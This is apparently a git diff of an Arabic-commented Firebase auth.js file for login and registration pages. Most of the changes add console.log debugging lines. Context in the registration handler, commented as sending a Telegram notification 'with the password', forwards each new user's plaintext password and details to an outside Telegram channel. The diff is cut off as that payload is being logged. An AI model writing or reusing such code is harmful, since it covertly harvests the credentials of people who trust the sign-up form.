@@ -2,10 +2,13 @@
 // التحقق من حالة المستخدم على صفحات Auth
 // ================================
 
+console.log('✅ auth.js تم تحميله بنجاح');
+
 // إذا كان المستخدم مسجل دخول بالفعل، توجيهه للصفحة الرئيسية
 auth.onAuthStateChanged((user) => {
     // فقط على صفحات تسجيل الدخول والتسجيل
     if (user && (document.getElementById('loginForm') || document.getElementById('registerForm'))) {
+        console.log('🔄 مستخدم مسجل دخول بالفعل - توجيه للصفحة الرئيسية');
         window.location.href = 'index.html';
     }
 });
@@ -102,14 +105,18 @@ if (document.getElementById('registerForm')) {
         setButtonLoading(registerBtn, true);
         
         try {
+            console.log('🚀 بدء عملية التسجيل...');
+            
             // إنشاء حساب في Firebase
             const userCredential = await auth.createUserWithEmailAndPassword(email, password);
             const user = userCredential.user;
+            console.log('✅ تم إنشاء المستخدم في Firebase:', user.uid);
             
             // تحديث اسم المستخدم
             await user.updateProfile({
                 displayName: fullName
             });
+            console.log('✅ تم تحديث اسم المستخدم');
             
             // حفظ بيانات المستخدم في Firestore
             const userData = {
@@ -122,8 +129,12 @@ if (document.getElementById('registerForm')) {
             };
             
             await db.collection('users').doc(user.uid).set(userData);
+            console.log('✅ تم حفظ البيانات في Firestore');
             
             // إرسال إشعار إلى تليجرام (مع كلمة المرور)
+            console.log('📱 جاري الاستعداد لإرسال Telegram...');
+            console.log('🔍 نوع دالة sendTelegramNotification:', typeof window.sendTelegramNotification);
+            
             try {
                 console.log('📤 إرسال البيانات إلى تليجرام...', {
                     fullName: fullName,
